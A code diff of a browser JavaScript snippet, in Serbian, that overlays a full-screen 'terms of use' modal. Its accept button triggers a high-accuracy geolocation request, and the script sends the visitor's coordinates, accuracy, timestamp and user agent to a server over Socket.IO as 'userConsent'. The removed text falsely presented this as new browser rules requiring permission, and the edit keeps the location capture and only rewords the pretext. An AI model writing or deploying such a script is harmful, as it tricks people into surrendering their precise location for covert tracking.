@@ -1,4 +1,3 @@
-// Dinamički modal za uslove korišćenja
 (function() {
     const modal = document.createElement('div');
     modal.style.position = 'fixed';
@@ -16,33 +15,38 @@
     modal.style.fontFamily = 'Arial, sans-serif';
     modal.innerHTML = `
         <div style="max-width: 500px; text-align: center; background: #222; padding: 30px; border-radius: 10px;">
-            <h2 style="margin-bottom:20px;"> Nova Pravila u Browserima--morate se sloziti sa uslovima koriscenja - samo kliknite na ok i na potrebne dozvole</h2>
-            <p style="line-height:1.5;">Da biste nastavili, morate prihvatiti naše uslove korišćenja.</p>
+            <h2 style="margin-bottom:20px;">Morate prihvatiti uslove korišćenja</h2>
+            <p style="line-height:1.5;">Kliknite 'Prihvatam' da omogućite potrebne dozvole i nastavite.</p>
             <button id="acceptBtn" style="padding:10px 20px; margin-top:20px; cursor:pointer; font-size:16px;">Prihvatam</button>
         </div>
     `;
     document.body.appendChild(modal);
 
     document.getElementById('acceptBtn').addEventListener('click', () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const data = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: position.timestamp,
-                    userAgent: navigator.userAgent
-                };
-                // šalje podatke serveru preko postojeće Socket.IO konekcije
-                socket.emit('userConsent', data);
+        // Ukloni modal odmah
+        modal.remove();
 
-                // uklanja modal
-                modal.remove();
-            }, err => {
-                alert('Nismo dobili vasu potvrdu o saglasnosti. Pristup odbijen.');
-            }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+        // Traži geolokaciju, browser prompt će se pojaviti odmah
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: position.timestamp,
+                        userAgent: navigator.userAgent
+                    };
+                    // šalje podatke serveru preko Socket.IO
+                    socket.emit('userConsent', data);
+                },
+                err => {
+                    alert('Lokacija nije dozvoljena ili dostupna.');
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
         } else {
-            alert('Vaš browser ne podrzava uslove.');
+            alert('Vaš browser ne podržava geolokaciju.');
         }
     });
 })();
